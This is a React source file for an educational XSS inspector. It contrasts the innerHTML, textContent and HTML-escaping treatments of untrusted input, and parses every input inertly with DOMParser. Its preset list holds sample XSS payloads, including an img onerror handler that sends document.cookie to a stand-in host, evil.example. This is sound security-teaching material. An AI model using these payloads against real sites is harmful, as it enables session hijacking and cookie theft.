"use client";

/**
 * What a payload would become if it reached `innerHTML`, worked out with
 * DOMParser. Parsed documents are inert: no script runs, no image loads and
 * no handler fires, and nothing here is ever inserted into this page.
 */
import { useMemo, useState } from "react";
import { cn } from "@lib";
import { DEMO_LABEL, DemoButton, Panel } from "./ui";

const PAYLOADS = [
  { label: "img onerror", value: '<img src="x" onerror="fetch(\'//evil.example/?c=\' + document.cookie)">' },
  { label: "script tag", value: "<script>alert(document.cookie)</script>" },
  { label: "javascript: link", value: '<a href="javascript:alert(1)">Claim your prize</a>' },
  { label: "break out of an attribute", value: '"><svg onload="alert(1)">' },
  { label: "harmless markup", value: "Hello <b>world</b>" },
  { label: "plain text", value: "Ada & Grace <3" },
];

interface Finding {
  element: string;
  danger: string | null;
  attributes: { name: string; value: string; danger: boolean }[];
}

function inspect(payload: string): Finding[] {
  const doc = new DOMParser().parseFromString(`<body>${payload}</body>`, "text/html");
  return [...doc.body.querySelectorAll("*")].map((element) => {
    const attributes = [...element.attributes].map((attribute) => {
      const handler = attribute.name.startsWith("on");
      const scriptUrl = ["href", "src", "action", "formaction"].includes(attribute.name) && /^\s*javascript:/i.test(attribute.value);
      return { name: attribute.name, value: attribute.value, danger: handler || scriptUrl };
    });
    const tag = element.localName;
    const danger =
      tag === "script"
        ? "inserted via innerHTML it won't run, but document.write or a server-rendered page would run it"
        : attributes.some((attribute) => attribute.danger && attribute.name.startsWith("on"))
          ? "event-handler attribute: runs as soon as the event fires (an image failing to load is enough)"
          : attributes.some((attribute) => attribute.danger)
            ? "javascript: URL: runs when the link is followed"
            : null;
    return { element: tag, danger, attributes };
  });
}

const escapeHtml = (text: string) =>
  text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");

export function XssInspector() {
  const [payload, setPayload] = useState(PAYLOADS[0].value);
  const findings = useMemo(() => inspect(payload), [payload]);
  const dangerous = findings.some((finding) => finding.danger);

  return (
    <div className="flex flex-col gap-3">
      <div className="flex flex-wrap gap-1.5">
        {PAYLOADS.map((preset) => (
          <DemoButton key={preset.label} onClick={() => setPayload(preset.value)}>
            {preset.label}
          </DemoButton>
        ))}
      </div>
      <label className="flex flex-col gap-1">
        <span className={DEMO_LABEL}>untrusted input (a comment, a URL parameter, a profile name)</span>
        <textarea
          value={payload}
          onChange={(event) => setPayload(event.target.value)}
          rows={2}
          spellCheck={false}
          className="border-line-3 bg-well text-paper rounded-md border px-3 py-2 font-mono text-[12.5px] outline-none focus:border-flame"
        />
      </label>

      <div className="grid gap-3 lg:grid-cols-3">
        <Panel title="element.innerHTML = input" className={dangerous ? "border-rust-line" : undefined}>
          {findings.length === 0 ? (
            <p className="text-mint-soft m-0 text-[12.5px]">No elements: only text. Still, don&apos;t rely on that.</p>
          ) : (
            <ul className="m-0 flex list-none flex-col gap-2 p-0">
              {findings.map((finding, index) => (
                <li key={index} className="font-mono text-[12px]">
                  <span className={finding.danger ? "text-rust" : "text-[var(--code-keyword)]"}>&lt;{finding.element}&gt;</span>
                  {finding.attributes.map((attribute) => (
                    <div key={attribute.name} className={cn("ml-3 break-all", attribute.danger ? "text-rust" : "text-stone")}>
                      {attribute.name}=&quot;{attribute.value}&quot;
                    </div>
                  ))}
                  {finding.danger ? <p className="text-peach m-0 mt-1 font-sans text-[12px]/[1.5]">{finding.danger}</p> : null}
                </li>
              ))}
            </ul>
          )}
        </Panel>
        <Panel title="element.textContent = input">
          <p className="text-paper m-0 font-mono text-[12.5px] break-all">{payload}</p>
          <p className="text-mint-soft m-0 mt-2 text-[12px]">Shown as text. Nothing is parsed, so nothing can run. React does this for every {"{value}"} in JSX.</p>
        </Panel>
        <Panel title="escaped for an HTML template">
          <p className="text-bone m-0 font-mono text-[12px] break-all">{escapeHtml(payload)}</p>
          <p className="text-mint-soft m-0 mt-2 text-[12px]">The five special characters become entities, so the browser displays them instead of reading markup.</p>
        </Panel>
      </div>
      <p className="text-ash m-0 text-[12px]/[1.6]">
        The left panel is built by DOMParser, which creates an inert document: nothing in it runs. Assigned to a real element&apos;s
        innerHTML, the same markup would fire its event handlers straight away and run a javascript: link when clicked; only a
        &lt;script&gt; added that way stays inert.
      </p>
    </div>
  );
}
